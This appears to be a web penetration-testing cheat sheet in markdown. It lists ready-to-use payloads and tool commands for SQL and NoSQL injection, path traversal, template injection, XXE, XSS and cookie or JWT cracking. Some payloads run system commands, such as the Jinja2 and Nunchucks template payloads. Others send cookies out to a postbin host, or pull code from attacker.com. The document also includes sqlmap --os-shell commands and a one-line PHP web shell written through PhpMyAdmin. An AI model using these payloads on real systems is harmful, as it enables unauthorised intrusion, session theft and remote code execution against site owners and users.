<picture>
    <source height="100px" srcset="https://user-images.githubusercontent.com/22857002/173634310-3549c3ef-b20b-445f-bae2-554c026d734c.svg#gh-dark-mode-only" media="(prefers-color-scheme: dark)">
    <img height="100px" src="https://user-images.githubusercontent.com/28403617/172732613-4ce46b3f-916f-4053-9ebf-76906a2d8d6d.svg#gh-light-mode-only">
</picture>

---

- [CMS](#cms)
- [Certificate](#certificate)
- [Cookies](#cookies)
- [Discovery Tool](#discovery-tool)
- [Download .git](#download-git)
- [Interesting routes](#interesting-routes)
- [Nosql Injection](#nosql-injection)
- [Path traversal (LFI)](#path-traversal-lfi)
- [PhpMyAdmin](#phpmyadmin)
- [Request](#request)
- [SQL Injection](#sql-injection)
- [SSTI](#ssti)
- [Server Side XSS](#server-side-xss)
- [XML external entity (XXE)](#xml-external-entity-xxe)
- [XSS Injection](#xss-injection)

# Discovery Tool
> Some ressources are accessible by the attacker but not referenced by the web application.
> Discovery tool bruteforce url or domain with wordlist to discover new content.

### Wordlist

| Name                      | Path                                                                    |
|:--------------------------|:------------------------------------------------------------------------|
| SecLists Raft Medium      | `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` |
| SecList DNS               | `/usr/share/seclists/Discovery/DNS/namelist.txt`                        |
| Dirbuster Small           | `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`           |
| Dirbuster Small Lowercase | `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt` |
| Dirb                      | `/usr/share/dirb/wordlists/common.txt`                                  |

### Extensions

| Type    | Extension      |
|:--------|:---------------|
| Script  | `php,js,twig`  |
| Text    | `html,txt,md`  |
| Data    | `json,csv`     |
| DB      | `db,sqlite`    |
| Linux   | `sh,bin`       |
| Windows | `ps1,exe`      |

### Cewl
> A tool to create a wordlist from a site.

```bash
cewl -d 5 -e --with-numbers http://example.com/
```

### ffuf
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/FUZZ'
```

*Most Popular domain discovery command*
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/ -H 'Host: FUZZ.host'
```

### Gobuster
```bash
gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -x html,php
```

### Feroxbuster
*(Best one)*
```bash
feroxbuster -u <url> -e -x html,js,php
```

### Dirb
```bash
dirb url -R
```

### GUI
```bash
dirbuster
```
```bash
owasp-zap
```

# Nosql Injection
> NoSQL databases (aka "not only SQL") are non-tabular databases and store data differently than relational tables.
> The syntax is different from traditional SQL syntax.
> Example: Mongo

### Common Pattern
```
' || 1==1 %00
' || 1==1 //
{ $ne: 1 }
true, $where: '1 == 1'
'; return 1 %00
```

### Form
```
username[$ne]=lol$password[$ne]=lol
username[$regex]=.*$password[$regex]=.*
username[$eq]=admin&password[$eq]=admin
```

### JSON
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$eq": "admin"}, "password": {"$ne": "admin"}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

# SQL Injection
> SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
> It generally allows an attacker to view data that they are not normally able to retrieve. - [Source](https://portswigger.net/web-security/sql-injection)


Interesting [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) of Port Swigger.

## Manual
### Common pattern
```
" OR ""="
' OR ''='
' OR 1=1 -- comment
OR 1=1
*
```

### Comment
```
-- comment
# comment
/* comment */
/*! comment */
```

### INSERT
```
admin", "") ON DUPLICATE KEY UPDATE password="newpasswd";
```
- [INSERT DUPLICATE KEY](https://mariadb.com/kb/en/insert-on-duplicate-key-update/)


### Separator
```
" UNION SELECT * FROM users
" ; SELECT * FROM users
```

### Interesting postgres function

#### Filter bypass
```
query_to_xml('SELECT * FROM users', true, false, '')
ts_stat('SELECT * FROM users')::text
```

#### Arbitrary read / write
```
# Write
lo_from_bytea(31337, decode('bG9saXBvcAo=', 'base64'))
lo_export(31337, '/tmp/lolipop')

# Read
lo_export(31338, '/etc/passwd')
lo_get(31338)
```

## SQLmap
> SQLmap is a tool that automates the process of detecting and exploiting SQL injection.

[SQLmap Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

### Discovery
```bash
sqlmap -r req
# If you know info
sqlmap -r req --os <os> --dbms <type db> --technique <tech>
```

- [List OS](https://github.com/sqlmapproject/sqlmap/wiki/Usage#force-the-database-management-system-operating-system-name)
- [List DBMS](https://github.com/sqlmapproject/sqlmap/wiki/Usage#force-the-dbms)
- [List Techniques](https://github.com/sqlmapproject/sqlmap/wiki/Usage#sql-injection-techniques-to-test-for)

### Get DB
```bash
# List databases
sqlmap -r req --predict-output --dbs
# List Tables
sqlmap -r req --predict-output --tables -D db
# Dump Table
sqlmap -r req --predict-output --dump -D db -T table 
# Dump Column(s)
sqlmap -r req --predict-output --dump -D db -T table -C column
```

### List Privileges
```bash
sqlmap -r req --current-user
sqlmap -r req --privileges
sqlmap -r req --roles
```

### File
```bash
# Read file
sqlmap -r req --file-read=/etc/passwd
# Upload file
sqlmap -r req --file-write=/local/file --file-dest=/dest/path
```

### Shell
```bash
# Upload Reverse shell
sqlmap -r req --os-shell
sqlmap -r req --os-cmd 'echo desbarres'
# Sql Shell
sqlmap -r req --sql-shell
```

### Optimize
```
-o                  Turn on all optimization switches
--predict-output    Predict common queries output
--keep-alive        Use persistent HTTP(s) connections
--null-connection   Retrieve page length without actual HTTP response body
--threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

--time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
```

### Turbo SQLmap
```bash
sqlmap -u 'https://example.com/?arg=*' --dump -T table_example -D example_db --level=2 --force-ssl --time-sec 1 --predict-output --dbms 'MySQL' --technique T  --flush-session
```

# Path traversal (LFI)
> A path traversal attack aims to access files and directories that are stored outside the web root folder by manipulating variables that reference files.
> It may be possible to access arbitrary files and directories including application source code or configuration and critical system files.

### Pattern
> Try to add `%00` at the end of your payload.

```
..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/%252f/etc/passwd
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252e%252e%252e%252fetc%252fpasswd%00
```
```
../
︰/
..%252f/
..%2f
%2e%2e%2f
%2e%2e/
%2e%2e%5c
..%5c
%252e%252e%255c
..%255c
..%c0%af
```

- [Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)
- [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

### PHP pattern
```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=http://attacker.com/reverse.php
php://filter/resource=/etc/passwd
zip://path/to/file.zip%23shell.php
http://attacker.com/reverse.php%00
```

- [PHP LFI](https://ruuand.github.io/Local_File_Include/)

# SSTI
> Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection.
> Template Injection can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE).
> [source](https://portswigger.net/research/server-side-template-injection)

### Test
```t
${{<%[%'"}}%\.
```
```
{{1+1}}
${1+1}
<%= 1+1 %>
${{1+1}}
#{1+1}
@(1+2)
```

### Nunchucks (Nodejs)
```
{{range.constructor("console.log(123)")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

### Python (Jinja2)
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{request.__class__._load_form_data.__globals__.__builtins__.__import__("os").popen("id").read()}}
```

### Golang
```
{{.}}
```

- [PayloadsAllTheThings - STTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Github Websites Vulnerable To SSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

# XML external entity (XXE)
> XML external entity (XXE) injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. 
> It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. - [source](https://portswigger.net/web-security/xxe)

### Read File
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
]>
<foo>Hello &file;</foo>
```

### Get Link
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "http://example.com/path">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/path">
]>
<foo>Hello &file;</foo>
```

# XSS Injection
> XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.
> [source](https://en.wikipedia.org/wiki/Cross-site_scripting)

### Script
```html
<script>window.open('https://www.toptal.com/developers/postbin/123-123?' + document.cookie);</script>
```
```html
<script>document.location = 'https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie);</script>
```
```html
<script>fetch('https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie), { method: 'GET',})</script>
```
```html
<img src=x onerror=alert() />
```

### Meta
```html
<meta http-equiv="refresh" content="0;url=http://example.com">
```

### Object
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

### Useful Link
- [Toptal/postbin - Exfiltrate information](https://www.toptal.com/developers/postbin/)
- [Generate Tags](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [CSP Evalutor](https://csp-evaluator.withgoogle.com/)
- [XSS Payload List](https://github.com/payloadbox/xss-payload-list)

# Server Side XSS
> Server XSS occurs when untrusted user supplied data is included in an HTTP response generated by the server.
> In this case, the entire vulnerability is in server-side code, and the browser is simply rendering the response and executing any valid script embedded in it.
> [source](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)

### Dynamic PDF
```xml
<iframe src=file:///etc/passwd></iframe>
<img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///etc/passwd">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id="portal">
<svg-dummy></svg-dummy><iframe src='file:///etc/passwd' width='100%' height='1000px'></iframe><svg viewBox='0 0 240 80' height='1000' width='1000' xmlns='http://www.w3.org/2000/svg'><text x='0' y='0' class='Rrrrr' id='demo'>data</text></svg>
```
```xml
<annotation file="/etc/passwd" content="/etc/passwd" icon="graph" title="Attached File: /etc/passwd" pos-x="195" />
```

### Extract annotation
You can extract annotation files with this [script](https://github.com/sawyerf/HackSheet/scripts/get-pdf-annot.py):
```bash
pip3 install pymupdf
python3 script/get-pdf-annot.py -f "<HTTP(S)_URL> OR <PDF_PATH>"
```

# Cookies
> Cookies can be hijack by different way.
> **Sign cookies** can be decode to find vulnerable informations or bruteforce to find secret in order to create your own cookies.
> Other type of cookies need to be steal to hijack session.

## Flask
> Flask cookies are sign cookie so you can decode it or bruteforce the secret.

### Decode
```bash
flask-unsign --decode --cookie 'eyJ1c2VyIjoiYWRtaW4ifQ.Y4za7g.ZHmbIsx0-wdFV_IgyWI7MruY9OY'
```

### Bruteforce
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign  --no-literal-eval --cookie 'eyJ1c2VyIjoiYWRtaW4ifQ.Y4za7g.ZHmbIsx0-wdFV_IgyWI7MruY9OY'
```

### Encode
```bash
flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'mySecret'
```

## Json Web Token (JWT)
> A JWT comes in this structure:
> `AAAAAA.BBBBBB.CCCCCC`.
> AAAAAA represents the header, BBBBBB represents the payload while CCCCCC represents the signature.
> 
> The most common algorithms for signing JWTs are:
> - HMAC + SHA256 (HS256)
> - RSASSA-PKCS1-v1_5 + SHA256 (RS256)
> - ECDSA + P-256 + SHA256 ( ES256)
>
> [Source](https://krevetk0.medium.com/brute-forcing-jwt-token-hs256-6f545d24c7c3)

### Encode / Decode
- [JWT.io](https://jwt.io/)

### Brute Force
```bash
jwtcrack "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.Fw4maeqOtL8pPwiI2_VzYBo4JQ91P1Ow3X3hNqx2wPg" < words/rockyou.txt
```
```bash
hashcat -r words/hob064.rule words/rockyou.txt --stdout | jwtcrack "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.Uzr5ePfZFgmvhMFYJ9WAYISmGLj7JE7SWO43OrfmcZM"
```
- [Github](https://github.com/ojensen5115/jwtcrack)


# Request
> Different tool to make a http request.

### Curl
```bash
curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' -sd 'username=login&password=pass'
```
```bash
curl -X POST https://example.com/api/submit -H "Content-Type: application/json" -sd '{"email":"lol@lol.com"}'
```

### Python
```python
import requests

# GET
requests.get('http://example.com')
# POST
requests.post('http://example.com/submit',
    headers={
        'Content-type': 'raw',
    },
    data={'user': 'guest'},
)
```
- [Details script](/wiki/Python.md#requests)

### Javascript
```javascript
//  GET
fetch('http://example.com/',{
    method: 'GET',
})

// POST
fetch('http://example.com/',{
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({data: 'lol'})
})
```

# Download .git
```bash
githacker --url http://url/.git/ --folder result
```
[Source](https://github.com/WangYihang/GitHacker)


```bash
git-dumper http://url .
```
[Source](https://github.com/arthaud/git-dumper)

# CMS
### Scaning
```bash
wpscan --force update -e --url IP --disable-tls-checks
```

# Certificate
```
curl <url> --key KEY.key --cert CERT.cert
```

# PhpMyAdmin
### Quick Shellcode
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
```
